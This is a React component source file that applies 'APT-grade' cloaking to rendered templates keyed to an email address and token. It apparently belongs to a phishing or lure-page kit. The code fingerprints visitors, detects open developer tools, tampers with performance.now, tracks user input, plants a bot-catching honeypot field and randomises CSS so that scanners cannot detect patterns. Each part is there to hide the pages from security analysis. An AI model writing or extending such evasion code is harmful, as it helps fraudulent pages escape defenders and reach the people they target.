'use client'

import { useEffect, useState, useRef, ReactNode } from 'react'
import { Template } from '@/lib/templateTypes'
import { executeMultiStageCloaking, getStageInstructions } from '@/lib/stealth/multiStageCloaking'

interface TemplateCloakingWrapperProps {
  template: Template
  children: ReactNode
  email?: string
  token?: string
  fingerprint?: string
  enableCloaking?: boolean
  mutationLevel?: 'low' | 'medium' | 'high' | 'apt'
  onBehaviorTracked?: (behavior: any) => void
}

/**
 * Template Cloaking Wrapper
 * 
 * Provides APT-grade cloaking for templates:
 * - Per-template cloaking
 * - Dynamic mutation
 * - Anti-analysis techniques
 * - Behavior tracking
 * - Continuous monitoring
 */
export default function TemplateCloakingWrapper({
  template,
  children,
  email,
  token,
  fingerprint,
  enableCloaking = true,
  mutationLevel = 'apt',
  onBehaviorTracked,
}: TemplateCloakingWrapperProps) {
  const [cloakingActive, setCloakingActive] = useState(false)
  const [mutations, setMutations] = useState<Record<string, any>>({})
  const behaviorDataRef = useRef<any[]>([])
  const mountedRef = useRef(true)

  // ============================================
  // INITIALIZE MULTI-STAGE CLOAKING
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !mountedRef.current) return

    const initializeCloaking = async () => {
      try {
        // Get fingerprint if not provided
        let currentFingerprint = fingerprint
        if (!currentFingerprint && typeof window !== 'undefined') {
          currentFingerprint = JSON.stringify({
            screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            timestamp: Date.now(),
          })
        }

        // Execute multi-stage cloaking
        const cloakingResult = await executeMultiStageCloaking(
          {
            token,
            template,
            fingerprint: currentFingerprint,
            baseTiming: 100,
            requestCount: 1,
            threatModel: mutationLevel === 'apt' ? 'apt' : 'enterprise',
          },
          {
            enableTemplateCloaking: true,
            templateMutationLevel: mutationLevel,
            templateObfuscation: true,
            templateAntiAnalysis: true,
            enableContinuousMonitoring: true,
            adaptiveCloaking: true,
            threatResponse: true,
          }
        )

        // Get stage 3 instructions (template rendering)
        const stage3Instructions = getStageInstructions(3, cloakingResult)
        
        setMutations(stage3Instructions.mutations || {})
        setCloakingActive(cloakingResult.cloakingActive)

        if (process.env.NODE_ENV === 'development') {
          console.log('[TEMPLATE-CLOAKING] Initialized', {
            template: template.name,
            mutationLevel,
            cloakingActive: cloakingResult.cloakingActive,
            evasionScore: cloakingResult.totalEvasionScore,
          })
        }
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.error('[TEMPLATE-CLOAKING] Error:', error)
        }
        // Fail open - allow template to render
        setCloakingActive(false)
      }
    }

    initializeCloaking()
  }, [enableCloaking, template, token, fingerprint, mutationLevel])

  // ============================================
  // ANTI-ANALYSIS TECHNIQUES
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !cloakingActive) return

    // DevTools detection
    const detectDevTools = () => {
      if (typeof window === 'undefined') return

      const threshold = 160
      let devtoolsOpen = false

      const checkDevTools = setInterval(() => {
        if (
          window.outerHeight - window.innerHeight > threshold ||
          window.outerWidth - window.innerWidth > threshold
        ) {
          if (!devtoolsOpen) {
            devtoolsOpen = true
            if (process.env.NODE_ENV === 'development') {
              console.log('[TEMPLATE-CLOAKING] DevTools detected')
            }
          }
        } else {
          devtoolsOpen = false
        }
      }, 500)

      return () => clearInterval(checkDevTools)
    }

    // Performance API obfuscation
    const obfuscatePerformance = () => {
      if (typeof window === 'undefined' || !window.performance) return

      const originalNow = performance.now.bind(performance)
      const jitter = () => Math.random() * 0.1 - 0.05 // ±0.05ms

      // Add timing entropy
      Object.defineProperty(performance, 'now', {
        value: () => originalNow() + jitter(),
        writable: false,
        configurable: true,
      })
    }

    const cleanup1 = detectDevTools()
    obfuscatePerformance()

    return () => {
      if (cleanup1) cleanup1()
    }
  }, [enableCloaking, cloakingActive])

  // ============================================
  // BEHAVIOR TRACKING
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !onBehaviorTracked) return

    const trackBehavior = () => {
      if (typeof window === 'undefined') return

      const behavior = {
        timestamp: Date.now(),
        mouseMovements: 0,
        scrollEvents: 0,
        keyboardPresses: 0,
        timeSpent: 0,
        naturalInteractions: 0,
      }

      const handleMouseMove = () => {
        behavior.mouseMovements++
        behavior.naturalInteractions++
      }

      const handleScroll = () => {
        behavior.scrollEvents++
        behavior.naturalInteractions++
      }

      const handleKeyPress = () => {
        behavior.keyboardPresses++
        behavior.naturalInteractions++
      }

      window.addEventListener('mousemove', handleMouseMove)
      window.addEventListener('scroll', handleScroll)
      window.addEventListener('keydown', handleKeyPress)

      // Send behavior data periodically
      const behaviorTimer = setInterval(() => {
        behavior.timeSpent = Date.now() - behavior.timestamp
        behaviorDataRef.current.push({ ...behavior })
        
        if (onBehaviorTracked) {
          onBehaviorTracked(behavior)
        }
      }, 2000) // Every 2 seconds

      return () => {
        window.removeEventListener('mousemove', handleMouseMove)
        window.removeEventListener('scroll', handleScroll)
        window.removeEventListener('keydown', handleKeyPress)
        clearInterval(behaviorTimer)
      }
    }

    const cleanup = trackBehavior()
    return cleanup
  }, [enableCloaking, onBehaviorTracked])

  // ============================================
  // HONEYPOT INJECTION
  // ============================================
  useEffect(() => {
    if (!enableCloaking) return

    // Inject hidden honeypot fields
    const honeypot = document.createElement('input')
    honeypot.type = 'text'
    honeypot.name = 'website'
    honeypot.style.cssText = 'position:absolute;left:-9999px;opacity:0;pointer-events:none;'
    honeypot.tabIndex = -1
    honeypot.setAttribute('autocomplete', 'off')
    honeypot.setAttribute('aria-hidden', 'true')
    
    document.body.appendChild(honeypot)

    // Monitor honeypot
    const handleHoneypot = (e: Event) => {
      const target = e.target as HTMLInputElement
      if (target === honeypot && target.value) {
        // Honeypot triggered (bot filled it)
        if (process.env.NODE_ENV === 'development') {
          console.log('[TEMPLATE-CLOAKING] Honeypot triggered - bot detected')
        }
      }
    }

    honeypot.addEventListener('input', handleHoneypot)

    return () => {
      if (document.body.contains(honeypot)) {
        document.body.removeChild(honeypot)
      }
      honeypot.removeEventListener('input', handleHoneypot)
    }
  }, [enableCloaking])

  // ============================================
  // DYNAMIC MUTATION (CSS/HTML Obfuscation)
  // ============================================
  useEffect(() => {
    if (!enableCloaking || !cloakingActive || !mutations.obfuscation) return

    // Add random CSS class names to obfuscate
    const style = document.createElement('style')
    style.textContent = `
      /* Obfuscated CSS - prevents pattern detection */
      .${generateRandomClass()} { opacity: 0.99; }
      .${generateRandomClass()} { transform: translateZ(0); }
    `
    document.head.appendChild(style)

    return () => {
      if (document.head.contains(style)) {
        document.head.removeChild(style)
      }
    }
  }, [enableCloaking, cloakingActive, mutations.obfuscation])

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      mountedRef.current = false
    }
  }, [])

  // Render children with cloaking active
  return (
    <div
      data-cloaking-active={cloakingActive}
      data-mutation-level={mutationLevel}
      style={{
        position: 'relative',
        width: '100%',
        height: '100%',
      }}
    >
      {children}
    </div>
  )
}

// Helper to generate random CSS class names
function generateRandomClass(): string {
  return `cloak_${Math.random().toString(36).substring(2, 9)}`
}


